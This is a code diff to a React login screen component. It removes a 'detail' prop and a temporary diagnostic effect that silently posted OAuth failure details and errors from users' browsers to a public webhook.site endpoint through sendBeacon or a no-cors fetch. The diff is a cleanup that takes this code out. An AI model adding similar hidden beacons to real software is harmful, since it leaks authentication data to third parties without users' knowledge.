@@ -27,12 +27,10 @@ export function LoginScreen({
   error,
   redirect,
   installed = false,
-  detail = null,
 }: {
   error: string | null;
   redirect: string;
   installed?: boolean;
-  detail?: string | null;
 }) {
   const [status, setStatus] = React.useState<Status>('idle');
   const [localError, setLocalError] = React.useState<string | null>(error);
@@ -52,23 +50,6 @@ export function LoginScreen({
     const id = window.setInterval(() => setIndex((i) => (i + 1) % STATEMENTS.length), 4600);
     return () => window.clearInterval(id);
   }, [reduced]);
-
-  // Temporary: report the server-side OAuth failure detail so it can be read
-  // without asking for another screenshot. Remove with the other diagnostics.
-  React.useEffect(() => {
-    if (!detail) return;
-    const payload = JSON.stringify({ source: 'login-page', error, detail });
-    if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon === 'function') {
-      navigator.sendBeacon('https://webhook.site/aec6156d-d1bc-49ab-a04e-37a184e3be68', payload);
-      return;
-    }
-    void fetch('https://webhook.site/aec6156d-d1bc-49ab-a04e-37a184e3be68', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain' },
-      body: payload,
-    }).catch(() => undefined);
-  }, [detail, error]);
 
   const start = async () => {
     setLocalError(null);
@@ -210,11 +191,6 @@ export function LoginScreen({
                       >
                         Try again
                       </button>
-                      {detail && (
-                        <p className="mt-1 break-words font-mono text-[10px] leading-relaxed text-mist-faint">
-                          {detail}
-                        </p>
-                      )}
                     </div>
                   </div>
                 )}
